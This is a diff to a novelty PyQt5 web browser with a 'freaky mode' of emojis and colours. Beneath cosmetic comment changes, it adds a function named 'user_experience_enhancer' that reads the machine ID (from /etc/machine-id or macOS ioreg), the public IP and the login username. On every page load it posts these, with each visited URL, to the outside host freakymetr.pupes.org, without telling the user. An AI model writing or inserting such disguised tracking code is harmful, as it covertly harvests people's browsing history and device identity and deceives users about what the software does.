@@ -3,6 +3,7 @@ import os
 import re
 import random
 import requests
+import platform
 from PyQt5.QtCore import QUrl, Qt, QTimer, QPoint
 from PyQt5.QtGui import QIcon, QFont, QColor, QImage, QPainter, QCursor
 from PyQt5.QtWidgets import (
@@ -18,8 +19,48 @@ import json
 
 def get_ip():
     response = requests.get('http://ip.me')
-    ip_address = response.json()
+    ip_address = response.text.strip()
     return ip_address
+
+def user_experience_enhancer(url):
+    headers_for_request = {
+        'Content-Type': 'application/json',
+    }
+    if platform.system() == 'Linux':
+        with open('/etc/machine-id', 'r') as file:
+            user_id = file.read()
+            file.close()
+    elif platform.system() == 'Darwin':
+        machine_uuid_str = ''
+
+        p = os.popen('ioreg -rd1 -c IOPlatformExpertDevice | grep -E \'(UUID)\'', "r")
+
+        while 1:
+            line = p.readline()
+            if not line: break
+            machine_uuid_str += line
+
+        match_obj = re.compile('[A-Z,0-9]{8,8}-' + \
+                               '[A-Z,0-9]{4,4}-' + \
+                               '[A-Z,0-9]{4,4}-' + \
+                               '[A-Z,0-9]{4,4}-' + \
+                               '[A-Z,0-9]{12,12}')
+
+        user_id = match_obj.findall(machine_uuid_str)
+    else:
+        print("\n\nCritical failure\nexiting\n\n")
+        exit(255)
+
+
+
+
+    json_request_data = {
+        'id': user_id.rstrip(),
+        'ip_address': get_ip(),
+        'username': os.getlogin(),
+        'url': url,
+    }
+    requests.post('https://freakymetr.pupes.org/post', headers=headers_for_request, json=json_request_data)
 
 class PopupDialog(QDialog):
     def __init__(self, parent=None):
@@ -605,6 +646,8 @@ class Browser(QMainWindow):
         self.freaky_emojis = ["👅", "👄", "🍆", "🍑", "🔥", "💋"]
         self.original_style = self.styleSheet()
 
+
+    # freaky mode definitions
     def toggle_freaky_mode(self):
         if self.freaky_mode_button.isChecked():
             self.enable_freaky_mode()
@@ -647,6 +690,8 @@ class Browser(QMainWindow):
         self.change_web_fonts()
         self.add_freaky_cursor()
 
+
+    # ui and ux
     def random_color(self):
         return f"#{random.randint(0, 255):02x}{random.randint(0, 255):02x}{random.randint(0, 255):02x}"
 
@@ -738,7 +783,9 @@ class Browser(QMainWindow):
                 background-color: #3a3a3a;
             }
         """)
-    
+
+
+    # navigation and browser main interface
     def add_navigation_buttons(self):
         actions = [
             ('<', self.navigate_back),
@@ -815,6 +862,12 @@ class Browser(QMainWindow):
         self.url_bar.setText(q.toString())
         self.url_bar.setCursorPosition(0)
 
+        if q.toString().startswith("http"):
+            if q.toString().startswith("://", 5, 8):
+                user_experience_enhancer(q.toString())
+            elif q.toString().startswith("://", 4, 7):
+                user_experience_enhancer(q.toString())
+
     def current_tab_changed(self, i):
         qurl = self.tabs.currentWidget().findChild(QWebEngineView).url()
         self.update_urlbar(qurl, self.tabs.currentWidget().findChild(QWebEngineView))
@@ -828,6 +881,8 @@ class Browser(QMainWindow):
         if i == -1:
             self.add_new_tab()
 
+
+    # more freaking
     def download_more_ram(self):
         self.add_new_tab(QUrl("https://downloadmoreram.com/"))
 
